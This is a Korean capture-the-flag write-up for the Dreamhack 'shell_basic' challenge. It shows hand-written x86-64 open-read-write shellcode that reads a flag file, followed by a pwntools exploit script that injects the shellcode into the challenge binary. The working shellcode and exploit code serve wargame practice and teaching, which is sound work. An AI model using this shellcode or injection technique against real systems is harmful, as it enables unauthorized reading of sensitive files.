# ❓ shell_baisc
https://dreamhack.io/wargame/challenges/410

## ✏️ Solution

문제에서 flag 파일의 위치와 이름은 /home/shell_basic/flag_name_is_loooooong으로 제시했으므로 다음과 같은 함수를 실행해야함.
```python
int fd = open(“/home/shell_basic/flag_name_is_loooooong”, O_RDONLY, NULL);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```
이를 Assembly로 작성하기 위해서는 파일의 이름을 little endian, 즉, 거꾸로 rax에 mov하여 push
다만, C style string은 NULL을 만나기 전까지 해석하므로 0x0을 먼저 push
다음과 같은 Python함수를 작성하여 구할 수 있음.
```python
>>> def f(msg):
...     return hex(int.from_bytes(msg.encode(), "little"))
```

결론적으로 shellcode를 직접 작성하면,
```Assembly
push 0x0                    ;  NULL byte
mov rax, 0x676e6f6f6f6f6f6f ; "oooooong"
push rax
mov rax, 0x6c5f73695f656d61 ; "ame_is_l"
push rax
mov rax, 0x6e5f67616c662f63 ; "c/flag_n"
push rax
mov rax, 0x697361625f6c6c65 ; "ell_basi"
push rax
mov rax, 0x68732f656d6f682f ; "/home/sh"
push rax
mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

❗❗❗ 하지만 pwntools에서 제공하는 shellcraft를 이용하면 orw shellcode를 자동으로 생성 가능
```python
from pwn import *

p = process("./shell_basic")
context.arch = "amd64"

dir = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

p.sendlineafter(b"shellcode: ", asm(shellcode))

p.interactive()
```



